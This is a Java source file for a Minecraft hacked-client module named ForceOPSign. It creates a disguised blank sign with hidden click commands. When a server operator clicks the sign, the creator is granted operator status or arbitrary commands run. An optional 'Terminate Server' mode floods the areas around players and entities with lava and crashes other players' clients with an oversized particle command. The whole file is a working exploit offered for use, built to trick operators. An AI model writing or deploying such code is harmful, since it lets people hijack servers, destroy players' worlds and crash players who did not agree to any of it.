//Credits to CrushedPixel for their first implementation of a forceOP sign module https://www.youtube.com/watch?v=KofDNaPZWfg

package pwn.noobs.trouserstreak.modules;

import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.friends.Friends;
import meteordevelopment.meteorclient.systems.modules.Module;
import net.minecraft.block.Block;
import net.minecraft.block.Blocks;
import net.minecraft.client.network.PlayerListEntry;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import pwn.noobs.trouserstreak.Trouser;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;

public class ForceOPSign extends Module {
    private final SettingGroup commandModes = settings.createGroup("Command Modes");
    private final SettingGroup commandlines = settings.createGroup("Commands");
    private final SettingGroup commandParameters = settings.createGroup("Command Parameters");
    public final Setting<Boolean> oldformat = commandModes.add(new BoolSetting.Builder()
            .name("Old Sign Format <v1.20")
            .description("Formats signs for Minecraft versions less than 1.20.")
            .defaultValue(true)
            .build()
    );
    public final Setting<Boolean> versionwarning = commandModes.add(new BoolSetting.Builder()
            .name("Version Warning")
            .description("Warns you about the module not working in MC server versions greater than 1.20.4.")
            .defaultValue(true)
            .build()
    );
    private final Setting<Modes> mode = commandModes.add(new EnumSetting.Builder<Modes>()
            .name("First Line Mode")
            .description("the mode")
            .defaultValue(Modes.ForceOP)
            .build());
    public final Setting<Integer> cloneSignYlevel = commandParameters.add(new IntSetting.Builder()
            .name("Clone Sign Y Level")
            .description("Clones the sign to this Y level above the sign.")
            .defaultValue(255)
            .sliderRange(-64,319)
            .visible(() -> mode.get() == Modes.CloneSign)
            .build()
    );
    private final Setting<String> thecommand1 = commandlines.add(new StringSetting.Builder()
            .name("Click Command1")
            .description("What command is run")
            .defaultValue("/kill @e")
            .visible(() -> mode.get() == Modes.AnyCommand)
            .build()
    );
    public final Setting<Boolean> skynet = commandModes.add(new BoolSetting.Builder()
            .name("Terminate Server")
            .description("Terminates the server when the operator clicks the sign. Runs /fill at all player and entity locations and spawns withers.")
            .defaultValue(false)
            .build()
    );
    public final Setting<Boolean> blockskynet = commandModes.add(new BoolSetting.Builder()
            .name("Command Block Termination")
            .description("Sets up Command blocks to run the following commands above the sign.")
            .defaultValue(false)
            .visible(() -> skynet.get())
            .build()
    );
    public final Setting<Integer> blockskynetYlevel = commandParameters.add(new IntSetting.Builder()
            .name("Command Block Y Level")
            .description("Sets up Command blocks at this Y level above the sign.")
            .defaultValue(254)
            .sliderRange(-64,319)
            .visible(() -> skynet.get() && blockskynet.get())
            .build()
    );
    private final Setting<Boolean> crashpeople = commandModes.add(new BoolSetting.Builder()
            .name("crash out players")
            .description("Crashes everyone excluding your friends and you.")
            .defaultValue(true)
            .visible(() -> skynet.get())
            .build()
    );
    private final Setting<String> thecommand2 = commandlines.add(new StringSetting.Builder()
            .name("Click Command2")
            .description("What command is run")
            .defaultValue("")
            .visible(() -> !skynet.get() || !crashpeople.get())
            .build()
    );
    private final Setting<String> thecommand3 = commandlines.add(new StringSetting.Builder()
            .name("Click Command3")
            .description("What command is run")
            .defaultValue("")
            .visible(() -> !skynet.get())
            .build()
    );
    private final Setting<String> thecommand4 = commandlines.add(new StringSetting.Builder()
            .name("Click Command4")
            .description("What command is run")
            .defaultValue("")
            .visible(() -> !skynet.get())
            .build()
    );
    private final Setting<Boolean> nocrashfrend = commandParameters.add(new BoolSetting.Builder()
            .name("dont-crash-friends")
            .description("Crashes everyone excluding your friends and you.")
            .defaultValue(true)
            .visible(() -> crashpeople.get() && skynet.get())
            .build()
    );
    private final Setting<Boolean> noterminatefrend = commandParameters.add(new BoolSetting.Builder()
            .name("dont-terminate-friends")
            .description("Terminate everyone excluding your friends and you.")
            .defaultValue(true)
            .visible(() -> skynet.get())
            .build()
    );
    private final Setting<Block> terminateblock = commandParameters.add(new BlockSetting.Builder()
            .name("TerminationBlock PLAYERS")
            .description("What is created around the Players (Default: Lava)")
            .defaultValue(Blocks.LAVA)
            .visible(() -> skynet.get())
            .build());
    public final Setting<Integer> terminateheight1 = commandParameters.add(new IntSetting.Builder()
            .name("TerminationTop PLAYERS")
            .description("Height /fill'd around Players")
            .defaultValue(1)
            .sliderRange(0,90)
            .visible(() -> skynet.get())
            .build()
    );
    public final Setting<Integer> terminateheight2 = commandParameters.add(new IntSetting.Builder()
            .name("TerminationBottom PLAYERS")
            .description("Height /fill'd around Players")
            .defaultValue(1)
            .sliderRange(0,90)
            .visible(() -> skynet.get())
            .build()
    );
    public final Setting<Integer> terminatewidth = commandParameters.add(new IntSetting.Builder()
            .name("TerminationWidth PLAYERS")
            .description("Width /fill'd around Players")
            .defaultValue(50)
            .sliderRange(0,90)
            .visible(() -> skynet.get())
            .build()
    );
    public final Setting<Integer> terminatedepth = commandParameters.add(new IntSetting.Builder()
            .name("TerminationDepth PLAYERS")
            .description("Depth /fill'd around Players")
            .defaultValue(50)
            .sliderRange(0,90)
            .visible(() -> skynet.get())
            .build()
    );
    private final Setting<Block> eterminateblock = commandParameters.add(new BlockSetting.Builder()
            .name("TerminationBlock ENTITIES")
            .description("What is created around the Entities (Default: Lava)")
            .defaultValue(Blocks.LAVA)
            .visible(() -> skynet.get())
            .build());
    public final Setting<Integer> eterminateheight1 = commandParameters.add(new IntSetting.Builder()
            .name("TerminationTop ENTITIES")
            .description("Height /fill'd around Entities")
            .defaultValue(2)
            .sliderRange(0,90)
            .visible(() -> skynet.get())
            .build()
    );
    public final Setting<Integer> eterminateheight2 = commandParameters.add(new IntSetting.Builder()
            .name("TerminationBottom ENTITIES")
            .description("Height /fill'd around Entities")
            .defaultValue(1)
            .sliderRange(0,90)
            .visible(() -> skynet.get())
            .build()
    );
    public final Setting<Integer> eterminatewidth = commandParameters.add(new IntSetting.Builder()
            .name("TerminationWidth ENTITIES")
            .description("Width /fill'd around Entities")
            .defaultValue(10)
            .sliderRange(0,90)
            .visible(() -> skynet.get())
            .build()
    );
    public final Setting<Integer> eterminatedepth = commandParameters.add(new IntSetting.Builder()
            .name("TerminationDepth ENTITIES")
            .description("Depth /fill'd around Entities")
            .defaultValue(10)
            .sliderRange(0,90)
            .visible(() -> skynet.get())
            .build()
    );
    public ForceOPSign() {
        super(Trouser.Main, "ForceOPSign", "Requires Creative mode! Creates a ClickEvent sign in your inventory. Give it to someone with OP who is also in creative mode and have them place then click the sign.");
    }

    @Override
    public void onActivate() {
        if (versionwarning.get()) error("!!!You need TrouserStreak for Minecraft 1.20.6 (or higher) to make it work on versions greater than 1.20.4!!!");
        if (!mc.player.getAbilities().creativeMode) {
            error("You need creative mode to make the sign.");
            toggle();
            return;
        }
        ItemStack stack = new ItemStack(Items.OAK_SIGN);
        NbtCompound blockEntityTag = new NbtCompound();
        NbtCompound tag = new NbtCompound();

        String commandValue1 = thecommand1.get();
        String commandValue2 = thecommand2.get();
        String commandValue3 = thecommand3.get();
        String commandValue4 = thecommand4.get();

        if (mode.get()==Modes.ForceOP) commandValue1 = "op "+mc.player.getName().getLiteralString();
        else if (mode.get()==Modes.CloneSign) commandValue1 = "clone ~ ~ ~ ~ ~ ~ to minecraft:overworld ~ "+cloneSignYlevel.get()+" ~ replace force";
        else if (mode.get()==Modes.AnyCommand) {
            if (commandValue1.startsWith("/")) {
                commandValue1 = commandValue1.substring(1);
            } else commandValue1 = thecommand1.get();
        }
        String theCommand = "execute as @a[name=!"+mc.player.getName().getLiteralString()+"] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @s[name=!"+mc.player.getName().getLiteralString()+"]";
        if (blockskynet.get()) theCommand = ("setblock ~ "+(blockskynetYlevel.get()-2)+" ~ minecraft:repeating_command_block{auto:1b,Command:\"execute as @a[name=!"+mc.player.getName().getLiteralString()+"] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @s[name=!"+mc.player.getName().getLiteralString()+"]\"}");
        CopyOnWriteArrayList<PlayerListEntry> players;
        if (nocrashfrend.get()) {
            players = new CopyOnWriteArrayList<>(mc.getNetworkHandler().getPlayerList());
            List<String> friendNames = new ArrayList<>();
            friendNames.add("name=!" + mc.player.getName().getLiteralString());
            for(PlayerListEntry player : players) {
                if(Friends.get().isFriend(player) && nocrashfrend.get()) friendNames.add("name=!" + player.getProfile().getName());
            }
            String friendsString = String.join(",", friendNames);
            theCommand = "execute as @a[" + friendsString + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @s[" + friendsString + "]";
            if (blockskynet.get()) theCommand = ("setblock ~ "+(blockskynetYlevel.get()-2)+" ~ minecraft:repeating_command_block{auto:1b,Command:\"execute as @a[" + friendsString + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @s[" + friendsString + "]\"}");
        }
        if (skynet.get() && crashpeople.get()) commandValue2 = theCommand;
        else {
            if (commandValue2.startsWith("/")) {
                commandValue2 = commandValue2.substring(1);
            } else commandValue2 = thecommand2.get();
        }
        String tfullString = eterminateblock.get().toString();
        String[] tparts = tfullString.split(":");
        String tblock = tparts[1];
        String tBlockName = tblock.replace("}", "");
        String theCommand2 = ("execute as @e at @s[name=!"+mc.player.getName().getLiteralString()+", type=!minecraft:player, type=!minecraft:wither, type=!minecraft:item] run fill " + "~" + eterminatewidth.get() + " " + "~" + eterminateheight1.get() + " " + "~" + eterminatedepth.get() + " " + "~-" + eterminatewidth.get() + " " + "~-" + eterminateheight2.get() + " " + "~-" + eterminatedepth.get() + " " + tBlockName);
        if (blockskynet.get()) theCommand2 = ("setblock ~ "+(blockskynetYlevel.get()-1)+" ~ minecraft:repeating_command_block{auto:1b,Command:\"execute as @e at @s[name=!"+mc.player.getName().getLiteralString()+", type=!minecraft:player, type=!minecraft:wither, type=!minecraft:item] run fill " + "~" + eterminatewidth.get() + " " + "~" + eterminateheight1.get() + " " + "~" + eterminatedepth.get() + " " + "~-" + eterminatewidth.get() + " " + "~-" + eterminateheight2.get() + " " + "~-" + eterminatedepth.get() + " " + tBlockName+"\"}");
        if (noterminatefrend.get()) {
            players = new CopyOnWriteArrayList<>(mc.getNetworkHandler().getPlayerList());
            List<String> friendNames = new ArrayList<>();
            friendNames.add("name=!" + mc.player.getName().getLiteralString());
            for(PlayerListEntry player : players) {
                if(Friends.get().isFriend(player) && nocrashfrend.get()) friendNames.add("name=!" + player.getProfile().getName());
            }
            String friendsString = String.join(",", friendNames);
            theCommand2 = ("execute as @e at @s[" + friendsString + ", type=!minecraft:player, type=!minecraft:wither, type=!minecraft:item] run fill " + "~" + eterminatewidth.get() + " " + "~" + eterminateheight1.get() + " " + "~" + eterminatedepth.get() + " " + "~-" + eterminatewidth.get() + " " + "~-" + eterminateheight2.get() + " " + "~-" + eterminatedepth.get() + " " + tBlockName);
            if (blockskynet.get()) theCommand2 = ("setblock ~ "+(blockskynetYlevel.get()-1)+" ~ minecraft:repeating_command_block{auto:1b,Command:\"execute as @e at @s[" + friendsString + ", type=!minecraft:player, type=!minecraft:wither, type=!minecraft:item] run fill " + "~" + eterminatewidth.get() + " " + "~" + eterminateheight1.get() + " " + "~" + eterminatedepth.get() + " " + "~-" + eterminatewidth.get() + " " + "~-" + eterminateheight2.get() + " " + "~-" + eterminatedepth.get() + " " + tBlockName+"\"}");
        }
        if (skynet.get()) commandValue3 = theCommand2;
        else {
            if (commandValue3.startsWith("/")) {
                commandValue3 = commandValue3.substring(1);
            } else commandValue3 = thecommand3.get();
        }
        String tfullString2 = terminateblock.get().toString();
        String[] tparts2 = tfullString2.split(":");
        String tblock2 = tparts2[1];
        String tBlockName2 = tblock2.replace("}", "");
        String theCommand3 = ("execute as @a at @s[name=!"+mc.player.getName().getLiteralString()+"] run fill " + "~" + terminatewidth.get() + " " + "~" + terminateheight1.get() + " " + "~" + terminatedepth.get() + " " + "~-" + terminatewidth.get() + " " + "~-" + terminateheight2.get() + " " + "~-" + terminatedepth.get() + " " + tBlockName2);
        if (blockskynet.get()) theCommand3 = ("setblock ~ "+blockskynetYlevel.get()+" ~ minecraft:repeating_command_block{auto:1b,Command:\"execute as @a at @s[name=!"+mc.player.getName().getLiteralString()+"] run fill " + "~" + terminatewidth.get() + " " + "~" + terminateheight1.get() + " " + "~" + terminatedepth.get() + " " + "~-" + terminatewidth.get() + " " + "~-" + terminateheight2.get() + " " + "~-" + terminatedepth.get() + " " + tBlockName2+"\"}");
        if (noterminatefrend.get()) {
            players = new CopyOnWriteArrayList<>(mc.getNetworkHandler().getPlayerList());
            List<String> friendNames = new ArrayList<>();
            friendNames.add("name=!" + mc.player.getName().getLiteralString());
            for(PlayerListEntry player : players) {
                if(Friends.get().isFriend(player) && nocrashfrend.get()) friendNames.add("name=!" + player.getProfile().getName());
            }
            String friendsString = String.join(",", friendNames);
            theCommand3 = ("execute as @a at @s[" + friendsString + "] run fill " + "~" + terminatewidth.get() + " " + "~" + terminateheight1.get() + " " + "~" + terminatedepth.get() + " " + "~-" + terminatewidth.get() + " " + "~-" + terminateheight2.get() + " " + "~-" + terminatedepth.get() + " " + tBlockName2);
            if (blockskynet.get()) theCommand3 = ("setblock ~ "+blockskynetYlevel.get()+" ~ minecraft:repeating_command_block{auto:1b,Command:\"execute as @a at @s[" + friendsString + "] run fill " + "~" + terminatewidth.get() + " " + "~" + terminateheight1.get() + " " + "~" + terminatedepth.get() + " " + "~-" + terminatewidth.get() + " " + "~-" + terminateheight2.get() + " " + "~-" + terminatedepth.get() + " " + tBlockName2+"\"}");
        }
        if (skynet.get()) commandValue4 = theCommand3;
        else {
            if (commandValue4.startsWith("/")) {
                commandValue4 = commandValue4.substring(1);
            } else commandValue4 = thecommand4.get();
        }

        //thank you to Rob https://github.com/xnite for figuring out to use a newline character to make a blank sign. sneak level 100 achieved
        String commandText1 = "{\"text\":\"\\n\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + commandValue1 + "\"}}";
        String commandText2 = "{\"text\":\"\\n\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + commandValue2 + "\"}}";
        String commandText3 = "{\"text\":\"\\n\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + commandValue3 + "\"}}";
        String commandText4 = "{\"text\":\"\\n\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + commandValue4 + "\"}}";

        String[] messages = new String[4];
        messages[0] = commandText1;
        messages[1] = commandText2;
        messages[2] = commandText3;
        messages[3] = commandText4;

        NbtList messageList = new NbtList();
        for (String message : messages) {
            messageList.add(NbtString.of(message));
        }
        if (!oldformat.get()) {
            blockEntityTag.put("front_text", new NbtCompound());
            blockEntityTag.getCompound("front_text").put("messages", messageList);
            blockEntityTag.put("back_text", new NbtCompound());
            blockEntityTag.getCompound("back_text").put("messages", messageList);

            tag.put("BlockEntityTag", blockEntityTag);
        } else {
            tag.put("BlockEntityTag", new NbtCompound());

            for (int i = 0; i < messages.length; i++) {
                tag.getCompound("BlockEntityTag").putString("Text" + (i + 1), messages[i]);
            }
        }
        stack.setNbt(tag);

        mc.interactionManager.clickCreativeStack(stack, 36 + mc.player.getInventory().selectedSlot);

        info("OP Sign created. Give it to an operator who is in creative mode and have them click it to execute the command.");

        toggle();
    }
    public enum Modes {
        ForceOP, CloneSign, AnyCommand
    }
}